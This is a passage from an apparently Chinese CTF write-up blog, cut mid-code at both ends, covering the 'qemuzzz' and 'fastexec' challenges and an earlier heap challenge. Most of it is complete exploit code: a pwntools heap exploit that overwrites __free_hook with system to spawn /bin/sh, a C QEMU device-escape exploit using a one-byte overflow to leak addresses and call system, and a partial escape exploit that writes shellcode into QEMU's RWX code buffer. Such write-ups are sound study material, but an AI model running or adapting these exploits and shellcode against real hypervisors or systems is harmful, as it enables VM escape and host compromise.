class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;chall&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, content)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, content)<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>delete(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop= <span class="hljs-literal">True</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_addr = leak<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, p64(heap_addr - <span class="hljs-number">0x11c10</span>)[:<span class="hljs-number">7</span>])<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop= <span class="hljs-literal">True</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, p64(leak)[:<span class="hljs-number">7</span>])<br><br>add(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>delete(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>delete(<span class="hljs-number">1</span>, p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])[:<span class="hljs-number">7</span>])<br>add(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>add(<span class="hljs-number">1</span>, p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])[:<span class="hljs-number">7</span>])<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p>直接参考上一篇博客：<a href="https://xtxtn.github.io/2023/09/20/auto-pwn/#game-pwn">https://xtxtn.github.io/2023/09/20/auto-pwn/#game-pwn</a></p><p>​                                                                   </p><h3 id="qemuzzz"><a href="#qemuzzz" class="headerlink" title="qemuzzz"></a>qemuzzz</h3><p>可以单字节溢出</p><img src="/img/19/Screenshot 2023-09-25 101415.png" style="zoom: 67%;" /><p>v3变量是设备结构体的基地址，v7是<code>cpu_physical_memory_rw</code>函数的地址；溢出后正好可以修改v3，将v3变量改大一点，这样以后使用<code>cpu_physical_memory_rw</code>函数读写数据时就可以越界读取信息，这样就可以泄漏堆地址和<code>cpu_physical_memory_rw</code>函数地址，最后修改相应的地址即可。</p><p>注意：使用<code>cpu_physical_memory_rw</code>函数前都是以v3作为基地址，再去通过其偏移找到读写信息，修改v3后先前读写信息就作废了。</p><p>完整exp（Ubuntu20）:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">void</span> * mmio;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> val)</span>&#123;<br>    *(<span class="hljs-type">uint64_t</span>*)(mmio + addr) = val;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span>&#123; <br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint64_t</span> *)(mmio + addr); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exec_cpu_physical_memory_rw</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint16_t</span> offset, <span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    mmio_write(<span class="hljs-number">0x20</span>, addr);<br>    mmio_write(<span class="hljs-number">0x10</span>, offset);<br>    mmio_write(<span class="hljs-number">0x18</span>, size);<br>    mmio_write(<span class="hljs-number">0x60</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">xor_0x209</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> offset, <span class="hljs-type">uint16_t</span> size)</span>&#123;<br>    mmio_write(<span class="hljs-number">0x10</span>, offset);<br>    mmio_write(<span class="hljs-number">0x18</span>, size);<br>    mmio_write(<span class="hljs-number">0x50</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">void</span> *buf;<br>    <span class="hljs-type">uint64_t</span> ptr_buf;<br>    <span class="hljs-type">int</span>  mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    mmio         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        buf  = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>);<br>        ptr_buf = gva_to_gpa(buf);<br>        <span class="hljs-keyword">if</span>(ptr_buf != <span class="hljs-number">0</span> &amp;&amp; (ptr_buf &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] the_ptr_buf_addr_is %#lx\n&quot;</span>, ptr_buf);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <br>    *(<span class="hljs-type">uint64_t</span>*)(buf) = ptr_buf;<br>    *(<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">0x8</span>) = <span class="hljs-number">0xf31</span>;<br>    *(<span class="hljs-type">uint16_t</span>*)(buf + <span class="hljs-number">0xa</span>) = <span class="hljs-number">0x50</span>;<br>    exec_cpu_physical_memory_rw(ptr_buf &gt;&gt; <span class="hljs-number">12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0x10</span>);<br>    exec_cpu_physical_memory_rw(ptr_buf &gt;&gt; <span class="hljs-number">12</span>, <span class="hljs-number">0xfff</span>, <span class="hljs-number">2</span>);<br>    <br>    mmio_write(<span class="hljs-number">0x60</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-type">uint64_t</span> heap_addr = *(<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">0xf20</span>);<br>    <span class="hljs-type">uint64_t</span> cpu_physical_memory_rw_addr = *(<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">0xf28</span>);<br>    <span class="hljs-type">uint64_t</span> elf_base = cpu_physical_memory_rw_addr - <span class="hljs-number">0x5bc5c0</span>;<br>    <span class="hljs-type">uint64_t</span> system_plt = elf_base + <span class="hljs-number">0x2A7A80</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_heap_addr_is %#lx\n&quot;</span>, heap_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_cpu_physical_memory_rw_addr_is %#lx\n&quot;</span>, cpu_physical_memory_rw_addr);<br><br>    xor_0x209(<span class="hljs-number">0x88</span>, <span class="hljs-number">0x118</span>);<br><br>    <span class="hljs-type">char</span> cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br>    <span class="hljs-type">uint64_t</span> cmd_addr = heap_addr + <span class="hljs-number">0x1510</span>;<br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">7</span> + <span class="hljs-number">0x8c0</span>, cmd, <span class="hljs-number">0x40</span>);<br><br>    *(<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">0x7</span> + <span class="hljs-number">0xd00</span>) = cmd_addr;<br>    *(<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">0x7</span> + <span class="hljs-number">0xd10</span>) = heap_addr + <span class="hljs-number">0xf70</span>;<br>    *(<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">0x7</span> + <span class="hljs-number">0xd18</span>) = system_plt;<br>    mmio_write(<span class="hljs-number">0x60</span>, <span class="hljs-number">0</span>);<br>    mmio_write(<span class="hljs-number">0x60</span>, <span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>​                                            </p><h3 id="fastexec"><a href="#fastexec" class="headerlink" title="fastexec"></a>fastexec</h3><p>fastexec_mmio_write函数对offset和size都没限制，可以实现任意写</p><img src="/img/19/Screenshot 2023-09-26 084145.png" style="zoom: 67%;" /><p>无法泄漏有效信息，且仅有一次任意地址写，完全不知道下一步怎样进行下去。看完官方的wp后，才知道Qemu会在内存中mmap一块内存作为TCG模块的代码缓冲区（TCG段的偏移每次都不同），这块内存是RWX的，修改里面的内容为shellcode即可。</p><p>exp如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">void</span> * mmio;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-comment">//printf(&quot;pfn_item_offset : %p\n&quot;, (uintptr_t)addr &gt;&gt; 9);</span><br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> val)</span>&#123;<br>    *(<span class="hljs-type">uint64_t</span>*)(mmio + addr) = val;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span>&#123; <br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint64_t</span> *)(mmio + addr); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_write</span><span class="hljs-params">(<span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> addr)</span>&#123;<br>    mmio_write(<span class="hljs-number">8</span>, offset);<br>    mmio_write(<span class="hljs-number">0x10</span>, size);<br>    mmio_write(<span class="hljs-number">0x18</span>, addr);<br>    mmio_write(<span class="hljs-number">0x20</span>, <span class="hljs-number">0xF62D</span>);<br>&#125;<br><br><span class="hljs-comment">//char shellcode[] = &quot;\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x11\x00\x00\x00\x67\x6e\x6f\x6d\x65\x2d\x63\x61\x6c\x63\x75\x6c\x61\x74\x6f\x72\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05&quot;;</span><br><span class="hljs-type">char</span> shellcode[] = &#123;<span class="hljs-number">72</span>, <span class="hljs-number">49</span>, <span class="hljs-number">201</span>, <span class="hljs-number">72</span>, <span class="hljs-number">129</span>, <span class="hljs-number">233</span>, <span class="hljs-number">247</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">72</span>, <span class="hljs-number">141</span>, <span class="hljs-number">5</span>, <span class="hljs-number">239</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">72</span>, <span class="hljs-number">187</span>, <span class="hljs-number">124</span>, <span class="hljs-number">199</span>, <span class="hljs-number">145</span>, <span class="hljs-number">218</span>, <span class="hljs-number">201</span>, <span class="hljs-number">186</span>, <span class="hljs-number">175</span>, <span class="hljs-number">93</span>, <span class="hljs-number">72</span>, <span class="hljs-number">49</span>, <span class="hljs-number">88</span>, <span class="hljs-number">39</span>, <span class="hljs-number">72</span>, <span class="hljs-number">45</span>, <span class="hljs-number">248</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">226</span>, <span class="hljs-number">244</span>, <span class="hljs-number">22</span>, <span class="hljs-number">252</span>, <span class="hljs-number">201</span>, <span class="hljs-number">67</span>, <span class="hljs-number">129</span>, <span class="hljs-number">1</span>, <span class="hljs-number">128</span>, <span class="hljs-number">63</span>, <span class="hljs-number">21</span>, <span class="hljs-number">169</span>, <span class="hljs-number">190</span>, <span class="hljs-number">169</span>, <span class="hljs-number">161</span>, <span class="hljs-number">186</span>, <span class="hljs-number">252</span>, <span class="hljs-number">21</span>, <span class="hljs-number">245</span>, <span class="hljs-number">32</span>, <span class="hljs-number">249</span>, <span class="hljs-number">247</span>, <span class="hljs-number">170</span>, <span class="hljs-number">186</span>, <span class="hljs-number">175</span>, <span class="hljs-number">21</span>, <span class="hljs-number">245</span>, <span class="hljs-number">33</span>, <span class="hljs-number">195</span>, <span class="hljs-number">50</span>, <span class="hljs-number">211</span>, <span class="hljs-number">186</span>, <span class="hljs-number">175</span>, <span class="hljs-number">93</span>, <span class="hljs-number">25</span>, <span class="hljs-number">191</span>, <span class="hljs-number">225</span>, <span class="hljs-number">181</span>, <span class="hljs-number">187</span>, <span class="hljs-number">206</span>, <span class="hljs-number">143</span>, <span class="hljs-number">25</span>, <span class="hljs-number">53</span>, <span class="hljs-number">148</span>, <span class="hljs-number">193</span>, <span class="hljs-number">150</span>, <span class="hljs-number">136</span>, <span class="hljs-number">227</span>, <span class="hljs-number">146</span>, <span class="hljs-number">103</span>, <span class="hljs-number">76</span>, <span class="hljs-number">233</span>, <span class="hljs-number">161</span>, <span class="hljs-number">225</span>, <span class="hljs-number">177</span>, <span class="hljs-number">217</span>, <span class="hljs-number">206</span>, <span class="hljs-number">49</span>, <span class="hljs-number">31</span>, <span class="hljs-number">199</span>, <span class="hljs-number">199</span>, <span class="hljs-number">141</span>, <span class="hljs-number">129</span>, <span class="hljs-number">51</span>, <span class="hljs-number">73</span>, <span class="hljs-number">82</span>, <span class="hljs-number">121</span>, <span class="hljs-number">199</span>, <span class="hljs-number">145</span>, <span class="hljs-number">218</span>, <span class="hljs-number">201</span>, <span class="hljs-number">186</span>, <span class="hljs-number">175</span>, <span class="hljs-number">93</span>&#125;;<br><br><span class="hljs-type">int</span> <span 